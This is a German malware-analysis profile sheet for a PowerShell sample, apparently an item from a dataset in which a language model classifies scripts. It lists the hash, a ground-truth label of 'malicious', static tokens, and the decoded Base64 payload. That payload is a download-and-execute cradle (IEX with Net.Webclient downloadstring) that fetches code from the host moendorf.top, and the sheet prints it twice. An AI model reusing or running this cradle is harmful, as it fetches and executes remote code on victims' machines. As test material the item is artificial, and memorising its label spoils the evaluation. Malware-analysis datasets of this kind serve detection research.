# Steckbrief: 0650ef83b3fa0ba158db8f846b2702a03b90ce85d691c2cbcade2b95e8d9271f.ps1

- SHA256: `0650ef83b3fa0ba158db8f846b2702a03b90ce85d691c2cbcade2b95e8d9271f`
- Groesse: 251 Bytes, 1 Zeilen
- Ground-Truth-Label (aus Ordner): **malicious**
- Kein Urteil enthalten. Bewertung erfolgt durch das LLM.

## Stufe 1 - Reine Extraktion
- Strings gesamt: 0 (Auszug unten)
- Base64-Bloecke gesamt: 1, davon dekodierbar: 1
- Dekodierter Base64-Block (Laenge 208):
  ```
  IEX (New-Object Net.Webclient).downloadstring("http://moendorf.top/index.php")
  ```

## Stufe 2 - Statische Merkmale (zusaetzlich)
- Auffaellige Tokens (Name: Vorkommen):
  - encodedcommand: 1
  - noprofile: 1

## Stufe 3 - Struktur (zusaetzlich)
- Beobachtete Abfolge:
  1. kodierten Befehl ausfuehren
- Dekodierte Befehle (Auszug):
  ```
  IEX (New-Object Net.Webclient).downloadstring("http://moendorf.top/index.php")
  ```
